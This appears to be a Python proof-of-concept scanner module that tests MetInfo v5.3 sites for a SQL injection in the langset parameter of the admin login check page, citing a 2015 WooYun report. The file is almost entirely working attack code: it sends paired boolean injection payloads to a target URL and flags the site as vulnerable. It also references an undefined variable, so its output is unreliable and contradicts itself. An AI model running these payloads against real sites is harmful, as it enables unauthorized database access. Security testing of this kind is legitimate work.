#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: metinfo v5.3sql注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0100846
author: Lucifer
description: metinfo /admin/login/login_check.php?langset=cn 的langset 参数没有过滤存在sql注入漏洞。
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class metinfo_login_check_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }

        true_url = self.url + r"/admin/login/login_check.php?langset=cn%27AnD%271%27=%271"
        false_url = self.url + r"/admin/login/login_check.php?langset=cn%27AnD%271%27=%272"
        try:
            req1 = requests.get(true_url, headers=headers, timeout=10, verify=False)
            req2 = requests.get(false_url, headers=headers, timeout=10, verify=False)
            if r"not have this language" in req2.text and r"not have this language" not in req1.text:
                printGreen("[+]Success:存在metinfo v5.3 SQL注入漏洞...(高危)\tpayload: "+false_url)
            if noexist:
                printBlue("[-]Info:不存在metinfo_login_check_sqli漏洞")

        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = metinfo_login_check_sqli(sys.argv[1])
    testVuln.run()